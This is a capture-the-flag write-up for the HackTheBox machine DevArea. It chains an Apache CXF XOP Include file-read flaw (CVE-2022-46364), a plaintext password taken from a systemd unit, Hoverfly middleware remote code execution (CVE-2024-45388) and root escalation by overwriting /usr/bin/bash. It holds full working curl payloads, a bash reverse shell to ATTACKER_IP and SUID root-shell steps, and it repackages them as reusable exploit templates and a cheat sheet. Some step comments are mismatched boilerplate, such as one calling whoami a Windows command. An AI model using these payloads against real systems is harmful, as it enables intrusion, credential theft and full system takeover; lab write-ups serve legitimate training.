# DevArea - HackTheBox Writeup

**Target:** `TARGET_IP`
**Domain:** `devarea.htb`
**OS:** Linux
**Difficulty:** Medium

---

## Attack Chain Overview

```
Nmap Scan (Ports 22, 80, 8080, 8500, 8888)
    ↓
Apache CXF Service Discovery (port 8080)
    ↓
CVE-2022-46364 — XOP Include SSRF/LFI
    ↓
Read /etc/passwd → User Enumeration (dev_ryan)
    ↓
Read hoverfly.service → Extract Admin Credentials
    ↓
Hoverfly Dashboard (port 8888) → CVE-2024-45388
    ↓
Authenticated RCE via Middleware API → Reverse Shell as dev_ryan
    ↓
Sudo Privilege Enumeration → syswatch.sh --version
    ↓
PATH Hijacking / Bash Overwrite → SUID Root Binary
    ↓
Root Shell → Root Flag
```

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Initial Access](#initial-access)
3. [Credential Discovery](#credential-discovery)
4. [Hoverfly RCE](#hoverfly-rce)
5. [User Flag](#user-flag)
6. [Privilege Escalation](#privilege-escalation)
7. [Root Flag](#root-flag)
8. [Key Takeaways](#key-takeaways)

---

## Reconnaissance

### Host Setup
```bash
# What it does: adds machine domains to /etc/hosts.
# Why here: resolve virtual hosts during web enumeration.
echo "TARGET_IP devarea.htb" | sudo tee -a /etc/hosts
```

### Nmap Scan
```bash
# What it does: runs an Nmap scan with the specified ports/scripts/options.
# Why here: identify exposed services and decide on the next enumeration.
nmap -sC -sV -p- TARGET_IP
```

**Key Findings:**

| Port     | Service           | Details                                  |
|----------|-------------------|------------------------------------------|
| 22/tcp   | SSH               | OpenSSH 9.6p1                            |
| 80/tcp   | HTTP              | Apache httpd 2.4.58 (redirects to vhost) |
| 8080/tcp | HTTP              | Jetty 9.4.27 — **Apache CXF SOAP service** |
| 8500/tcp | HTTP              | Golang net/http (Hoverfly proxy)         |
| 8888/tcp | HTTP              | Golang net/http (Hoverfly dashboard)     |

### Web Application Enumeration

Port 80 hosts a CTF platform, but the real entry point is the **Apache CXF SOAP service** on port 8080, accessible at `http://devarea.htb:8080/employeeservice`.

```bash
# Test CXF service endpoint
# What it does: sends an HTTP request with the chosen method, headers or body.
# Why here: test or trigger the web behavior described in this step.
curl -s http://devarea.htb:8080/employeeservice?wsdl
```

**Result:** WSDL schema returned — confirms a SOAP web service for employee management.

---

## Initial Access

### CVE-2022-46364 — Apache CXF XOP Include SSRF/LFI

**Background:** Apache CXF 3.2.14 is vulnerable to a Server-Side Request Forgery (SSRF) and Local File Inclusion (LFI) attack via the `<xop:Include>` XML element. The XOP (XML-binary Optimized Packaging) specification is designed to embed binary data in XML messages, but Apache CXF fails to validate the `href` attribute, allowing attackers to read arbitrary files using the `file://` protocol.

**Vulnerability Details:**
- **CVE:** CVE-2022-46364
- **Affected Version:** Apache CXF < 3.2.15, < 3.3.10, < 3.4.7, < 3.5.4
- **Attack Vector:** Crafted multipart SOAP request with `<xop:Include href="file:///path/to/file">`
- **Impact:** Arbitrary file read as the service user

### Step 1 — Read /etc/passwd

```bash
# What it does: sends an HTTP request with the chosen method, headers or body.
# Why here: test or trigger the web behavior described in this step.
curl -s -X POST http://devarea.htb:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; start="<rootpart@soapui.org>"; start-info="text/xml"; boundary="MIMEBoundary"' \
  --data-binary $'--MIMEBoundary\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: <rootpart@soapui.org>\r\n\r\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/">\r\n  <soapenv:Body>\r\n    <dev:submitReport>\r\n      <arg0>\r\n        <employeeName><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/passwd"/></employeeName>\r\n        <department>x</department>\r\n        <content>x</content>\r\n        <confidential>false</confidential>\r\n      </arg0>\r\n    </dev:submitReport>\r\n  </soapenv:Body>\r\n</soapenv:Envelope>\r\n--MIMEBoundary--\r\n'
```

**Response:** The service returns a **base64-encoded** version of `/etc/passwd`. Decode it:

```bash
# What it does: decodes or encodes Base64 data.
# Why here: convertir loot codificado en texto utilizable.
echo "<base64_output>" | base64 -d
```

**Key Findings:**
```
root:x:0:0:root:/root:/bin/bash
dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash
hoverfly:x:1002:1002::/opt/HoverFly:/bin/false
```

**User `dev_ryan` identified** — our target for lateral movement.

### Step 2 — Read Additional Files

```bash
# Read SSH keys
# What it does: sends an HTTP request with the chosen method, headers or body.
# Why here: test or trigger the web behavior described in this step.
curl -s -X POST http://devarea.htb:8080/employeeservice \
  -H 'Content-Type: multipart/related; ...' \
  --data-binary $'...<xop:Include href="file:///home/dev_ryan/.ssh/id_rsa"/>...'

# Read application configuration
curl -s -X POST http://devarea.htb:8080/employeeservice \
  -H 'Content-Type: multipart/related; ...' \
  --data-binary $'...<xop:Include href="file:///opt/HoverFly/config.yml"/>...'
```

---

## Credential Discovery

### Read Hoverfly Systemd Service File

The Hoverfly service configuration often contains command-line arguments with embedded credentials.

```bash
# What it does: sends an HTTP request with the chosen method, headers or body.
# Why here: test or trigger the web behavior described in this step.
curl -s -X POST http://devarea.htb:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; start="<rootpart@soapui.org>"; start-info="text/xml"; boundary="MIMEBoundary"' \
  --data-binary $'--MIMEBoundary\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: <rootpart@soapui.org>\r\n\r\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/">\r\n  <soapenv:Body>\r\n    <dev:submitReport>\r\n      <arg0>\r\n        <employeeName><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/systemd/system/hoverfly.service"/></employeeName>\r\n        <department>x</department>\r\n        <content>x</content>\r\n        <confidential>false</confidential>\r\n      </arg0>\r\n    </dev:submitReport>\r\n  </soapenv:Body>\r\n</soapenv:Envelope>\r\n--MIMEBoundary--\r\n'
```

**Decode the base64 response:**
```bash
# What it does: decodes or encodes Base64 data.
# Why here: convertir loot codificado en texto utilizable.
echo "<base64_output>" | base64 -d
```

**Result:**
```ini
[Unit]
Description=HoverFly service

[Service]
User=dev_ryan
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0
```

**🎯 FOUND — Hoverfly admin credentials:**
- **Username:** `admin`
- **Password:** `O7IJ27MyyXiU`

---

## Hoverfly RCE

### CVE-2024-45388 — Authenticated RCE via Middleware API

**Background:** Hoverfly is an API simulation tool used for testing and development. Version prior to the CVE-2024-45388 patch allows authenticated users to configure middleware scripts that are executed by the system. The middleware API accepts a `script` parameter that is passed directly to the shell without proper sanitization, enabling **arbitrary command execution**.

**Vulnerability Details:**
- **CVE:** CVE-2024-45388
- **Affected Component:** Hoverfly middleware API (`/api/v2/hoverfly/middleware`)
- **Authentication Required:** Yes (admin credentials)
- **Attack Vector:** PUT request with malicious `script` parameter
- **Impact:** Remote code execution as the Hoverfly service user (`dev_ryan`)

### What is Hoverfly?

Hoverfly is an open-source **API simulation tool** that acts as a proxy to capture, simulate, and mock API interactions. It's commonly used in development and testing environments. The middleware feature allows users to inject custom scripts that process requests passing through the proxy.

### Step 1 — Obtain JWT Token

```bash
# What it does: sends an HTTP request with the chosen method, headers or body.
# Why here: test or trigger the web behavior described in this step.
curl -X POST http://devarea.htb:8888/api/token-auth \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"O7IJ27MyyXiU"}'
```

**Response:**
```json
{
  "token": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODYxNzI2MDMsImlhdCI6MTc3NTEzMjYwMywic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.p_ynLww4e0usCz88fQnbWRl1qBf96zZtghHv9HVAsmpKlggm_b0Q61D8LrV_VZE-qh-18_aTUBv1ueJ-gwTy_A"
}
```

### Step 2 — Inject Reverse Shell via Middleware

**1. Set up listener:**
```bash
# What it does: opens or uses a TCP connection/listener.
# Why here: receive shell, transfer data or check connectivity.
nc -lvnp 4444
```

**2. Craft malicious middleware payload:**
```bash
TOKEN="eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODYxNzI2MDMsImlhdCI6MTc3NTEzMjYwMywic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.p_ynLww4e0usCz88fQnbWRl1qBf96zZtghHv9HVAsmpKlggm_b0Q61D8LrV_VZE-qh-18_aTUBv1ueJ-gwTy_A"

# What it does: sends an HTTP request with the chosen method, headers or body.
# Why here: test or trigger the web behavior described in this step.
curl -s -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "binary": "bash",
    "script": "#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
  }'
```

**Payload Breakdown:**
- `binary`: `bash` — Specifies the interpreter for the script
- `script`: Bash reverse shell payload — Gets executed when the middleware processes a request

### Step 3 — Trigger the Middleware

The middleware executes when a request passes through the Hoverfly proxy (port 8500):

```bash
# What it does: sends an HTTP request with the chosen method, headers or body.
# Why here: test or trigger the web behavior described in this step.
curl -x http://devarea.htb:8500 http://example.com
```

**3. Reverse shell received:**
```bash
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 4444
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
dev_ryan@devarea:~$
```

**✅ Initial access achieved as user `dev_ryan`.**

---

## User Flag

```bash
dev_ryan@devarea:~$ cat /home/dev_ryan/user.txt
```

**User Flag:** *(To be captured during box exploitation)*

---

## Enumeration

### System Enumeration

```bash
# Check user identity
id
# uid=1001(dev_ryan) gid=1001(dev_ryan) groups=1001(dev_ryan)

# Check sudo permissions
# What it does: lists sudo privileges of the current or specified user.
# Why here: encontrar comandos permitidos para escalar privilegios.
sudo -l
```

**Critical Finding:**
```
Matching Defaults entries for dev_ryan on devarea:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dev_ryan may run the following commands on devarea:
    (ALL) NOPASSWD: /opt/syswatch/syswatch.sh --version
```

### Sudo Permission Analysis

| Permission | Impact |
|------------|--------|
| `(ALL)` | Can run as any user (including root) |
| `NOPASSWD` | No password required |
| `/opt/syswatch/syswatch.sh --version` | Only this specific command and argument allowed |

---

## Privilege Escalation

### PATH Hijacking / SUID Binary Abuse

The `/opt/syswatch/syswatch.sh` script calls `bash` without specifying the **absolute path**. This means if we can control which `bash` binary is executed, we can escalate privileges.

### Vulnerability Analysis

**Script Behavior (inferred):**
```bash
# The script likely does something like:
#!/bin/bash
# What it does: imprime o escribe texto controlado.
# Why here: crear la entrada o archivo pequeno necesario para el siguiente paso.
echo "System Watcher Version 1.0"
bash -c "some_command"   # ← Calls 'bash' without absolute path
```

**Exploit Strategy:**
1. Backup the real `/usr/bin/bash` binary
2. Replace it with a malicious script that creates a SUID root shell
3. Execute `syswatch.sh` via sudo — our fake `bash` runs as root
4. Use the SUID shell to get root access

### Step 1 — Backup Real Bash

```bash
# What it does: copies or moves a file.
# Why here: prepare payloads or place loot where the next command expects it.
cp /usr/bin/bash /tmp/bash.bak
# What it does: changes permissions or owner.
# Why here: make a payload executable or control access to a file.
chmod +x /tmp/bash.bak
```

### Step 2 — Switch to `sh` and Kill All Bash Processes

We need to free the `/usr/bin/bash` binary from any open file handles before we can overwrite it:

```bash
# Switch to sh (which uses /bin/sh, not /usr/bin/bash)
exec sh

# Kill all remaining bash processes
pkill -9 bash

# Verify no open handles
lsof /usr/bin/bash
```

**Why This Works:** Linux prevents modification of files that are currently in use. By switching to `sh` and killing all bash processes, we release the file lock on `/usr/bin/bash`.

### Step 3 — Overwrite /usr/bin/bash with Malicious Script

```bash
# What it does: displays a file in the terminal.
# Why here: read configuration, credentials, proof or flags.
cat > /usr/bin/bash << 'EOF'
#!/tmp/bash.bak
# What it does: copies or moves a file.
# Why here: prepare payloads or place loot where the next command expects it.
cp /tmp/bash.bak /tmp/rootbash
# What it does: changes permissions or owner.
# Why here: make a payload executable or control access to a file.
chmod 4755 /tmp/rootbash
EOF

chmod +x /usr/bin/bash
```

**Payload Breakdown:**
- `#!/tmp/bash.bak` — Shebang pointing to the real bash binary (prevents syntax errors)
- `cp /tmp/bash.bak /tmp/rootbash` — Copies real bash to a new location
- `chmod 4755 /tmp/rootbash` — Sets the **SUID bit** — the binary will run with root privileges

**What is SUID?** The SUID (Set User ID) permission bit allows a binary to execute with the privileges of its owner (root, in this case). Any user running `/tmp/rootbash` will get a root shell.

### Step 4 — Trigger Syswatch

```bash
# What it does: ejecuta un comando permitido por sudo con ruta absoluta.
# Why here: disparar la primitiva de privesc encontrada con sudo -l.
sudo /opt/syswatch/syswatch.sh --version
```

The script executes our fake `bash` as root, creating the SUID binary:

```bash
# What it does: lists directory contents.
# Why here: verificar archivos, permisos o loot en la ruta actual.
ls -la /tmp/rootbash
# -rwsr-xr-x 1 root root 1446024 Apr  2 12:43 /tmp/rootbash
```

**✅ SUID root binary created successfully.**

### Step 5 — Spawn Root Shell

```bash
/tmp/rootbash -p
# What it does: executes a Windows command line action.
# Why here: enumerate, transfer, replace or validate artifacts on the victim.
whoami
# root
```

**Why `-p`?** The `-p` (privileged) flag tells bash to preserve the effective UID (root) instead of dropping privileges. Without it, bash would detect the SUID and drop to the real UID.

---

## Root Flag

```bash
root@devarea:~# cat /root/root.txt
```

**Root Flag:** `3592e27ecf9e1e9837087dae6817f29e`

---

## Alternative Privilege Escalation Methods

### Method 1 — Direct Script Modification

If `/opt/syswatch/syswatch.sh` is writable:
```bash
# What it does: escribe un comando payload en un archivo o entrada vulnerable.
# Why here: convertir script/ruta escribible en ejecucion de codigo.
echo "cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash" >> /opt/syswatch/syswatch.sh
# What it does: ejecuta un comando permitido por sudo con ruta absoluta.
# Why here: disparar la primitiva de privesc encontrada con sudo -l.
sudo /opt/syswatch/syswatch.sh --version
```

### Method 2 — PATH Hijacking

If the script calls a command without absolute path:
```bash
# Create malicious 'cp' binary in /tmp
# What it does: copies or moves a file.
# Why here: prepare payloads or place loot where the next command expects it.
cp /bin/bash /tmp/cp
# What it does: changes permissions or owner.
# Why here: make a payload executable or control access to a file.
chmod +x /tmp/cp

# Prepend /tmp to PATH
export PATH=/tmp:$PATH

# Execute syswatch
# What it does: ejecuta un comando permitido por sudo con ruta absoluta.
# Why here: disparar la primitiva de privesc encontrada con sudo -l.
sudo /opt/syswatch/syswatch.sh --version
```

---

## Key Takeaways

| Stage | Technique | Key Detail |
|-------|-----------|------------|
| **Recon** | Nmap scan | Apache CXF SOAP service on port 8080, Hoverfly on 8500/8888 |
| **Initial Access** | CVE-2022-46364 (XOP Include LFI) | `<xop:Include href="file:///etc/passwd">` reads arbitrary files |
| **Credential Discovery** | LFI → systemd service file | `hoverfly.service` contained plaintext admin password |
| **RCE** | CVE-2024-45388 (Hoverfly middleware) | Authenticated RCE via PUT request to `/api/v2/hoverfly/middleware` |
| **User Flag** | Reverse shell as `dev_ryan` | Bash reverse shell triggered through Hoverfly proxy |
| **Privilege Escalation** | SUID binary via bash overwrite | Replaced `/usr/bin/bash` with SUID-creating script |
| **Root Flag** | SUID root shell | `/tmp/rootbash -p` → root access |

### Security Lessons

1. **Validate XOP href attributes** — Apache CXF failed to restrict `file://` protocol access
2. **Never store passwords in systemd files** — Hoverfly credentials were visible in plaintext
3. **Authenticate API endpoints** — Hoverfly middleware API required authentication but lacked authorization controls
4. **Use absolute paths in scripts** — `syswatch.sh` called `bash` without `/usr/bin/bash`, enabling PATH hijacking
5. **Restrict sudo permissions** — Even limited sudo commands can be exploited through binary substitution
6. **SUID bit detection** — Modern bash detects SUID and drops privileges; use `-p` flag to override (but this is a known attack vector)

---

## CVE-2022-46364 Exploit Reference

### SOAP Request Template

```bash
# What it does: sends an HTTP request with the chosen method, headers or body.
# Why here: test or trigger the web behavior described in this step.
curl -s -X POST http://TARGET:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; start="<rootpart@soapui.org>"; start-info="text/xml"; boundary="MIMEBoundary"' \
  --data-binary $'--MIMEBoundary\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: <rootpart@soapui.org>\r\n\r\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/">\r\n  <soapenv:Body>\r\n    <dev:submitReport>\r\n      <arg0>\r\n        <employeeName><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///TARGET_FILE"/></employeeName>\r\n        <department>x</department>\r\n        <content>x</content>\r\n        <confidential>false</confidential>\r\n      </arg0>\r\n    </dev:submitReport>\r\n  </soapenv:Body>\r\n</soapenv:Envelope>\r\n--MIMEBoundary--\r\n'
```

### Files to Target

| File Path | Information Gained |
|-----------|-------------------|
| `/etc/passwd` | User enumeration |
| `/etc/shadow` | Password hashes (if readable) |
| `/home/user/.ssh/id_rsa` | SSH private keys |
| `/etc/systemd/system/*.service` | Service credentials |
| `/opt/*/config.yml` | Application credentials |
| `/var/log/auth.log` | Authentication logs |

---

## Hoverfly CVE-2024-45388 Exploit Reference

### Authentication

```bash
# Obtain JWT token
# What it does: sends an HTTP request with the chosen method, headers or body.
# Why here: test or trigger the web behavior described in this step.
curl -X POST http://TARGET:8888/api/token-auth \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"PASSWORD"}'
```

### Middleware RCE

```bash
# Set reverse shell middleware
TOKEN="<JWT_TOKEN>"
# What it does: sends an HTTP request with the chosen method, headers or body.
# Why here: test or trigger the web behavior described in this step.
curl -s -X PUT http://TARGET:8888/api/v2/hoverfly/middleware \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"binary":"bash","script":"#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"}'

# Trigger execution
curl -x http://TARGET:8500 http://example.com
```

---

## SUID Binary Privilege Escalation Cheat Sheet

### Understanding SUID

```bash
# Check for SUID binaries
# What it does: searches the filesystem with the specified filters.
# Why here: locate credentials, binaries, configs or writable paths.
find / -perm -4000 -type f 2>/dev/null

# SUID permission breakdown
# -rwsr-xr-x
#  ^^^
#  |└─┴─┴─ Regular permissions (owner, group, others)
#  └─ SUID bit set (executes as file owner)
```

### Common SUID Exploitation

```bash
# Find SUID binaries
# What it does: searches the filesystem with the specified filters.
# Why here: locate credentials, binaries, configs or writable paths.
find / -perm -4000 -type f 2>/dev/null

# Exploit common SUID binaries
find / -perm -4000 -type f -name "bash" 2>/dev/null
find / -perm -4000 -type f -name "sh" 2>/dev/null

# Create SUID root shell
# What it does: copies or moves a file.
# Why here: prepare payloads or place loot where the next command expects it.
cp /bin/bash /tmp/rootbash
# What it does: changes permissions or owner.
# Why here: make a payload executable or control access to a file.
chmod 4755 /tmp/rootbash
/tmp/rootbash -p
```

### Bash Overwrite Technique

```bash
# 1. Backup real bash
# What it does: copies or moves a file.
# Why here: prepare payloads or place loot where the next command expects it.
cp /usr/bin/bash /tmp/bash.bak

# 2. Switch to sh, kill bash processes
exec sh
pkill -9 bash
lsof /usr/bin/bash

# 3. Overwrite with malicious script
# What it does: displays a file in the terminal.
# Why here: read configuration, credentials, proof or flags.
cat > /usr/bin/bash << 'EOF'
#!/tmp/bash.bak
# What it does: copies or moves a file.
# Why here: prepare payloads or place loot where the next command expects it.
cp /tmp/bash.bak /tmp/rootbash
# What it does: changes permissions or owner.
# Why here: make a payload executable or control access to a file.
chmod 4755 /tmp/rootbash
EOF

# 4. Trigger via sudo
sudo /path/to/vulnerable_script.sh
```


